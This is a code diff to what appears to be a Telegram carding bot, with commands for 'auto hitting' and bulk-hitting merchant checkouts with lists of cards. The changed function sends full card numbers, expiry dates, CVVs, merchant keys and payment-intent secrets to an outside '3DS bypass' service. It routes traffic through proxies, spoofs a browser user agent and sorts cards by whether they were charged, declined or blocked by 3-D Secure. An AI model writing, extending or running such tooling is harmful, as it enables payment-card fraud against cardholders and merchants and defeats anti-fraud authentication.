@@ -14095,46 +14095,85 @@ async def gate_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # AUTO HITTER COMMAND
 # ============================================================================
 
-async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "", proxy_url: str = None) -> dict:
+async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "",
+                                   pi_client_secret: str = "", proxy_url: str = None) -> dict:
     """Attempt 3DS bypass via premium.dotbypasser.workers.dev.
+    Uses GET /bypass?cc=...&mm=...&yy=...&cvv=...&sk=PK&pi=PI_CS&url=URL
     Returns a result dict with at least 'status' and 'response' keys.
-    status is one of: CHARGED / DECLINED / FAILED / ERROR"""
-    BYPASS_API = "https://premium.dotbypasser.workers.dev/bypass"
-    payload = {
-        "cc":  card["cc"],
-        "mm":  str(card["month"]),
-        "yy":  str(card["year"])[-2:],
-        "cvv": card["cvv"],
-        "url": checkout_url,
-    }
-    if pk:
-        payload["pk"] = pk
+    status is one of: CHARGED / DECLINED / 3DS_REQUIRED / ERROR"""
+    import asyncio as _asyncio
+
+    BYPASS_BASE = "https://premium.dotbypasser.workers.dev/bypass"
+    yy = str(card["year"])[-2:]
+
+    def _do_request():
+        import requests as _r
+        params = {
+            "cc":  card["cc"],
+            "mm":  str(card["month"]),
+            "yy":  yy,
+            "cvv": card["cvv"],
+        }
+        if pk:
+            params["sk"] = pk
+        if pi_client_secret:
+            params["pi"] = pi_client_secret
+        if checkout_url:
+            params["url"] = checkout_url
+
+        kw = {
+            "params": params,
+            "timeout": 30,
+            "headers": {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "application/json, */*",
+            }
+        }
+        if proxy_url:
+            kw["proxies"] = {"http": proxy_url, "https": proxy_url}
+        try:
+            resp = _r.get(BYPASS_BASE, **kw)
+            print(f"[bypass] HTTP {resp.status_code} — {resp.text[:200]}", flush=True)
+            try:
+                return resp.json()
+            except Exception:
+                return {"_raw": resp.text}
+        except Exception as exc:
+            print(f"[bypass] request error: {exc}", flush=True)
+            return {"_exc": str(exc)}
+
     try:
-        import aiohttp as _aio
-        timeout = _aio.ClientTimeout(total=30)
-        async with _aio.ClientSession(timeout=timeout) as sess:
-            req_kw = {"json": payload, "headers": {"Content-Type": "application/json"}}
-            if proxy_url:
-                req_kw["proxy"] = proxy_url
-            async with sess.post(BYPASS_API, **req_kw) as resp:
-                data = await resp.json(content_type=None)
+        data = await _asyncio.to_thread(_do_request)
     except Exception as exc:
-        return {"status": "ERROR", "response": f"Bypass API error: {str(exc)[:60]}"}
+        return {"status": "ERROR", "response": f"Bypass error: {str(exc)[:60]}"}
 
-    if "error" in data and "limit" not in str(data["error"]).lower():
-        return {"status": "ERROR", "response": str(data["error"])[:80]}
+    if "_exc" in data:
+        return {"status": "ERROR", "response": f"Bypass error: {data['_exc'][:60]}"}
+    if "_raw" in data:
+        return {"status": "ERROR", "response": f"Bypass bad JSON: {data['_raw'][:60]}"}
 
-    raw_status = str(data.get("status", data.get("result", ""))).upper()
-    message    = str(data.get("response", data.get("message", data.get("msg", "Unknown"))))
+    err = str(data.get("error", ""))
+    # "Route not found" or "unauthorized" → treat as error (API blocked/changed)
+    if err and "limit" not in err.lower() and "rate" not in err.lower():
+        return {"status": "ERROR", "response": err[:80]}
 
-    if raw_status in ("CHARGED", "APPROVED", "SUCCESS", "LIVE", "CCN"):
+    raw_status = str(data.get("status", data.get("result", data.get("Status", "")))).upper().strip()
+    message    = str(data.get("response", data.get("message", data.get("msg",
+                    data.get("Response", err or str(data))))))[:120]
+
+    print(f"[bypass] status={raw_status!r} msg={message!r}", flush=True)
+
+    if raw_status in ("CHARGED", "APPROVED", "SUCCESS", "LIVE", "CCN", "CHARGE", "AUTH"):
         return {"status": "CHARGED", "response": f"3DS Bypassed — {message}",
                 "success_url": data.get("success_url", ""), "decline_code": "N/A"}
-    if raw_status in ("DECLINED", "FAIL", "FAILED", "DEAD", "CVV", "INCORRECT_CVC"):
+    if raw_status in ("DECLINED", "FAIL", "FAILED", "DEAD", "CVV", "INCORRECT_CVC",
+                      "DO_NOT_HONOR", "INSUFFICIENT_FUNDS", "CARD_DECLINED"):
         return {"status": "DECLINED", "response": f"[Bypass] {message}"}
-    if "3DS" in raw_status or raw_status in ("REQUIRES_ACTION", "3DS_REQUIRED"):
+    if "3DS" in raw_status or raw_status in ("REQUIRES_ACTION", "3DS_REQUIRED",
+                                              "REQUIRES_PAYMENT_METHOD"):
         return {"status": "3DS_REQUIRED", "response": "3DS not bypassable"}
-    return {"status": "DECLINED", "response": f"[Bypass] {message}"}
+    # Unknown status — treat as declined
+    return {"status": "DECLINED", "response": f"[Bypass:{raw_status or 'unknown'}] {message}"}
 
 
 async def _run_auto_hit(update, context, url, cards, loading_msg):
@@ -14267,7 +14306,9 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                     await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, i, email=user_email, trial_info=trial_info),
                     parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
                 )
-                _bypass = await _bypass_3ds_dotbypasser(card, url, checkout_data.get("pk", ""), proxy_url)
+                _pi_cs = result.get("pi_client_secret", "")
+                _bypass = await _bypass_3ds_dotbypasser(
+                    card, url, checkout_data.get("pk", ""), _pi_cs, proxy_url)
                 _bstatus = _bypass.get("status", "ERROR")
                 if _bstatus == "CHARGED":
                     card_statuses[i] = f"CHARGED (3DS Bypassed) {EMOJI['charged']}"
@@ -14286,6 +14327,10 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                 elif _bstatus == "DECLINED":
                     card_statuses[i] = f"Declined {EMOJI['declined']} — {html.escape(_bypass.get('response','')[:50])}"
                     results["declined"].append(card_str)
+                elif _bstatus == "ERROR":
+                    _berr = html.escape(_bypass.get("response", "bypass failed")[:45])
+                    card_statuses[i] = f"3DS ⚠️ {_berr}"
+                    results["3ds"].append(card_str)
                 else:
                     card_statuses[i] = f"3DS Required {EMOJI['3ds']}"
                     results["3ds"].append(card_str)
@@ -14644,7 +14689,9 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if idx >= 0:
                 card_statuses[idx] = f"3DS → Bypassing... {EMOJI['3ds']}"
             _bcard = {"cc": cc, "month": month, "year": year, "cvv": cvv}
-            _bypass = await _bypass_3ds_dotbypasser(_bcard, checkout_url, checkout_data.get("pk", ""), proxy_url)
+            _pi_cs = result.get("pi_client_secret", "")
+            _bypass = await _bypass_3ds_dotbypasser(
+                _bcard, checkout_url, checkout_data.get("pk", ""), _pi_cs, proxy_url)
             _bstatus = _bypass.get("status", "ERROR")
             if _bstatus == "CHARGED":
                 if idx >= 0:
@@ -14663,6 +14710,11 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if idx >= 0:
                     card_statuses[idx] = f"Declined {EMOJI['declined']} — {html.escape(_bypass.get('response','')[:50])}"
                 declined.append((raw_str, _bypass.get("response", "")))
+            elif _bstatus == "ERROR":
+                if idx >= 0:
+                    _berr = html.escape(_bypass.get("response", "bypass failed")[:45])
+                    card_statuses[idx] = f"3DS ⚠️ {_berr}"
+                tds.append(raw_str)
             else:
                 if idx >= 0:
                     card_statuses[idx] = f"3DS Required {EMOJI['3ds']}"
